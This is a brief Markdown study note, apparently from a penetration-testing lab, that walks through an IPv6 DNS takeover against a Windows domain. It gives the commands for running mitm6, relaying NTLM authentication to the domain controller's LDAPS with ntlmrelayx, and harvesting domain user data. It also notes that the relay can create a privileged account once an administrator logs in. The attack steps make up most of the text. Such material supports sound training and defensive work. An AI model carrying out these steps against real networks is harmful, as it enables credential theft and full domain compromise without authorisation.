# IPv6 Attacks Overview

## How Does it Work

* IPv4 is usually utilized, and IPv6 is sometimes turned on but not used
* Windows calls out to a non-existent IPv6 DNS server
* that means there is NO DNS server for IPv6, so you can setup an attacker machine as IPv6 DNS
* you can gain authenticate to the Domain Controller through LDAP or SMB
* you can grab NTLM hashes, just like Responder

## IPv6 DNS Takeover with via mitm6

* [https://github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
* may have to downgrade mitm6 if there are problems

### Step 1: Spin up mitm6

```bash
mitm -d marvel.local
```

### Step 2: Setup Relay Attack

```bash
ntlmrelayx.py -6 -t ldaps://<domain controller ip> -wh fakewpad.marvel.local -l lootmefile
```

### Step 3: Wait for IPv6 to try to find a DNS

* in lab enviroments, reboot the machine to force this step
* elsewhere, you must wait, roughly ever 30 minutes.

### Step 4: Check the LootMeFile

```bash
cd lootmefile
```

```bash
firefox domain_users_by_group.html
```

* this has tons of juicy information

### Note: If an Admin logs in, it will try to make you an Admin account

* it will output a username and password for you, meaning you own the domain
* it edits the ACL for the user and stores a file called ACLPWN to restore back to the original ACL

## Other Cool Attacks with mitm6 and Resources

* [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberosdelegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
* [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

